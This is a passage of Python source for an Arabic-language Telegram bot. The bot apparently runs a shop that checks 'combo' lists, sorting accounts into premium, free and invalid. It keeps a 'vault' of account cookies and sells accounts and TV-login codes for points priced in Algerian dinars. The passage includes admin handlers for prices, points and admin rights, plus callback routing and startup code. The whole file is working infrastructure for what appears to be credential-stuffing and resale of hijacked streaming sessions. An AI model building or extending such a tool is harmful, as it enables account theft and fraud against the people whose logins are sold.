                user_state[uid]["mode"] = "idle"
                await status.edit_text(
                    f"✅ <b>اكتمل</b>\n\n"
                    f"📥 {total}\n🌟 {premium}\n🆓 {free}\n❌ {invalid}\n"
                    f"⚡ {time.time()-start_time:.1f}s\n"
                    f"📦 {count_vault_cookies()}",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "admin"), callback_data="admin_panel")]]))

        except Exception as e:
            log.exception("combo failed")
            await update.message.reply_text(f"❌ {str(e)[:100]}")


# ============================================================
# TEXT HANDLER
# ============================================================
async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    mode = user_state.get(uid, {}).get("mode", "idle")
    text = update.message.text.strip()

    if mode == "awaiting_tv_code":
        await handle_tv_code_input(update, context); return

    if not is_admin(uid):
        return

    if mode == "admin_set_price":
        try:
            p = int(text)
            if p < 1: raise ValueError
            set_account_price(p)
            user_state[uid]["mode"] = "idle"
            await update.message.reply_text(f"✅ {p}")
            await notify_channel(context, f"💵 <b>السعر الجديد:</b> {p} نقطة")
        except Exception:
            await update.message.reply_text(t(uid, "invalid_number"))
        return

    if mode == "admin_set_market":
        try:
            p = int(text)
            if p < 1: raise ValueError
            set_market_price(p)
            user_state[uid]["mode"] = "idle"
            await update.message.reply_text(f"✅ {p} د.ج")
        except Exception:
            await update.message.reply_text(t(uid, "invalid_number"))
        return

    if mode == "admin_add_points":
        try:
            parts = text.split()
            target = int(parts[0]); amount = int(parts[1])
            new_balance = add_points(target, amount)
            user_state[uid]["mode"] = "idle"
            await update.message.reply_text(
                t(uid, "added_points", amount=amount, uid=target, balance=new_balance),
                parse_mode="HTML")
            try:
                await context.bot.send_message(target,
                    f"➕ +{amount}\n💰 {new_balance}", parse_mode="HTML")
            except Exception: pass
            await notify_channel(context, f"➕ <code>{target}</code> +{amount} = {new_balance}")
        except Exception:
            await update.message.reply_text(t(uid, "invalid_format"))
        return

    if mode == "admin_remove_points":
        try:
            parts = text.split()
            target = int(parts[0]); amount = int(parts[1])
            new_balance = remove_points(target, amount)
            user_state[uid]["mode"] = "idle"
            await update.message.reply_text(
                t(uid, "removed_points", amount=amount, uid=target, balance=new_balance),
                parse_mode="HTML")
        except Exception:
            await update.message.reply_text(t(uid, "invalid_format"))
        return

    if mode == "admin_promote":
        try:
            target = int(text)
            if target in dyn_admins or target == OWNER_ID:
                await update.message.reply_text(t(uid, "already_pending")); return
            dyn_admins.append(target)
            save_dyn_admins(dyn_admins)
            user_state[uid]["mode"] = "idle"
            await update.message.reply_text(t(uid, "promoted", uid=target), parse_mode="HTML")
            try:
                await context.bot.send_message(target, "🎉", parse_mode="HTML")
            except Exception: pass
        except Exception:
            await update.message.reply_text(t(uid, "invalid_number"))
        return

    if mode == "admin_demote":
        try:
            target = int(text)
            if target not in dyn_admins:
                await update.message.reply_text(t(uid, "not_admin")); return
            dyn_admins.remove(target)
            save_dyn_admins(dyn_admins)
            user_state[uid]["mode"] = "idle"
            await update.message.reply_text(t(uid, "demoted", uid=target), parse_mode="HTML")
        except Exception:
            await update.message.reply_text(t(uid, "invalid_number"))
        return


# ============================================================
# CALLBACK ROUTER
# ============================================================
async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    data = q.data
    uid = q.from_user.id

    if data.startswith("setlang_"):
        lang = data.replace("setlang_", "")
        user = get_user(uid)
        user["lang"] = lang
        set_user(uid, user)
        await q.answer(f"✅ {LANGS[lang]['name']}")
        await back_home(update, context)
        return

    if data == "change_lang":
        await q.answer()
        await q.edit_message_text(
            TEXTS[get_user(uid).get("lang", "ar")]["choose_lang"],
            parse_mode="HTML", reply_markup=lang_markup())
        return

    if data == "back_home":
        await back_home(update, context); return
    if data == "buy":
        await buy_menu(update, context); return
    if data == "buy_phone":
        await buy_phone(update, context); return
    if data == "buy_tv":
        await buy_tv(update, context); return
    if data == "topup":
        await topup(update, context); return
    if data == "topup_submit":
        await topup_submit(update, context); return
    if data == "ref_link":
        await ref_link(update, context); return
    if data == "my_purchases":
        await my_purchases(update, context); return
    if data == "my_account":
        await my_account(update, context); return

    if data == "admin_panel":
        await admin_panel(update, context); return
    if data == "admin_check":
        await admin_check(update, context); return
    if data == "admin_clear":
        await admin_clear(update, context); return
    if data == "admin_set_price":
        await admin_set_price(update, context); return
    if data == "admin_set_market":
        await admin_set_market(update, context); return
    if data == "admin_add_points":
        await admin_add_points(update, context); return
    if data == "admin_remove_points":
        await admin_remove_points(update, context); return
    if data == "admin_promote":
        await admin_promote(update, context); return
    if data == "admin_demote":
        await admin_demote(update, context); return
    if data == "admin_topups":
        await admin_topups(update, context); return
    if data == "admin_stats":
        await admin_stats(update, context); return

    if data.startswith("apv_"):
        await admin_approve_topup(update, context); return
    if data.startswith("rej_"):
        await admin_reject_topup(update, context); return

    await q.answer()


# ============================================================
# MAIN
# ============================================================
def main():
    print("=" * 55)
    print(f"  🎬 {STORE_NAME} BOT v3")
    print("=" * 55)
    print(f"  Vault: {count_vault_cookies()}")
    print(f"  Price: {get_account_price()} pts")
    print(f"  Market: {get_market_price()} DZD")
    print(f"  Channel: {CHANNEL_ID}")
    print("=" * 55)

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(callback_router))
    app.add_handler(MessageHandler(filters.Document.ALL & filters.ChatType.PRIVATE, file_upload))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    print("🚀 Running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
